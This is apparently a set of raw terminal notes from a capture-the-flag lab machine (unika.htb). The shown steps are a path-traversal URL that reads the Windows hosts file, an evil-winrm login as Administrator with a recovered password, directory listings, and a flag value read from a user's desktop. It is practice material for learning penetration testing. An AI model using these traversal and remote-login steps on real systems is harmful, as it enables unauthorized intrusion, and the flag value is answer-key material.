@@ -1,0 +1,116 @@
+http://unika.htb/index.php?page=../../../../../../../../../../windows/system32/drivers/etc/hosts
+
+# Copyright (c) 1993-2009 Microsoft Corp. # # This is a sample HOSTS file used by Microsoft TCP/IP for Windows. # # This file contains the mappings of IP addresses to host names. Each # entry should be kept on an individual line. The IP address should # be placed in the first column followed by the corresponding host name. # The IP address and the host name should be separated by at least one # space. # # Additionally, comments (such as these) may be inserted on individual # lines or following the machine name denoted by a '#' symbol. # # For example: # # 102.54.94.97 rhino.acme.com # source server # 38.25.63.10 x.acme.com # x client host # localhost name resolution is handled within DNS itself. # 127.0.0.1 localhost # ::1 localhost 
+
+                                                                                                                   
+┌──(root㉿kali)-[~]
+└─# evil-winrm -i 10.129.85.25 -u Administrator -p badminton
+
+Evil-WinRM shell v3.4
+
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+
+Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                                                                   
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\Administrator\Documents> dir
+*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..
+*Evil-WinRM* PS C:\Users\Administrator> dir
+
+
+    Directory: C:\Users\Administrator
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d-r---        10/11/2020   7:19 AM                3D Objects
+d-r---        10/11/2020   7:19 AM                Contacts
+d-r---          3/9/2022   5:34 PM                Desktop
+d-r---         3/10/2022   4:51 AM                Documents
+d-r---        10/11/2020   7:19 AM                Downloads
+d-r---        10/11/2020   7:19 AM                Favorites
+d-r---        10/11/2020   7:19 AM                Links
+d-r---        10/11/2020   7:19 AM                Music
+d-r---         4/27/2020   6:01 AM                OneDrive
+d-r---        10/11/2020   7:19 AM                Pictures
+d-r---        10/11/2020   7:19 AM                Saved Games
+d-r---        10/11/2020   7:19 AM                Searches
+d-r---        10/11/2020   7:19 AM                Videos
+
+
+*Evil-WinRM* PS C:\Users\Administrator> cd Desktop
+dir*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> cd ..
+*Evil-WinRM* PS C:\Users\Administrator> cd Downloads
+dir
+*Evil-WinRM* PS C:\Users\Administrator\Downloads> dir
+*Evil-WinRM* PS C:\Users\Administrator\Downloads> cd ..
+*Evil-WinRM* PS C:\Users\Administrator> cd Documents
+dir*Evil-WinRM* PS C:\Users\Administrator\Documents> dir
+*Evil-WinRM* PS C:\Users\Administrator\Documents> ls
+*Evil-WinRM* PS C:\Users\Administrator\Documents> cd
+*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..
+*Evil-WinRM* PS C:\Users\Administrator> ls
+
+
+    Directory: C:\Users\Administrator
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d-r---        10/11/2020   7:19 AM                3D Objects
+d-r---        10/11/2020   7:19 AM                Contacts
+d-r---          3/9/2022   5:34 PM                Desktop
+d-r---         3/10/2022   4:51 AM                Documents
+d-r---        10/11/2020   7:19 AM                Downloads
+d-r---        10/11/2020   7:19 AM                Favorites
+d-r---        10/11/2020   7:19 AM                Links
+d-r---        10/11/2020   7:19 AM                Music
+d-r---         4/27/2020   6:01 AM                OneDrive
+d-r---        10/11/2020   7:19 AM                Pictures
+d-r---        10/11/2020   7:19 AM                Saved Games
+d-r---        10/11/2020   7:19 AM                Searches
+d-r---        10/11/2020   7:19 AM                Videos
+
+
+*Evil-WinRM* PS C:\Users\Administrator> ls Desktop
+*Evil-WinRM* PS C:\Users\Administrator> cd ..
+*Evil-WinRM* PS C:\Users> ls
+
+
+    Directory: C:\Users
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d-----          3/9/2022   5:35 PM                Administrator
+d-----          3/9/2022   5:33 PM                mike
+d-r---        10/10/2020  12:37 PM                Public
+
+
+l*Evil-WinRM* PS C:\Users> ls mike
+
+
+    Directory: C:\Users\mike
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d-----         3/10/2022   4:51 AM                Desktop
+
+
+*Evil-WinRM* PS C:\Users> ls mike/Desktop
+
+
+    Directory: C:\Users\mike\Desktop
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a----         3/10/2022   4:50 AM             32 flag.txt
+
+
+*Evil-WinRM* PS C:\Users> cat mike/Desktop/flag.txt
+ea81b7afddd03efaa0945333ed147fac
+*Evil-WinRM* PS C:\Users> 
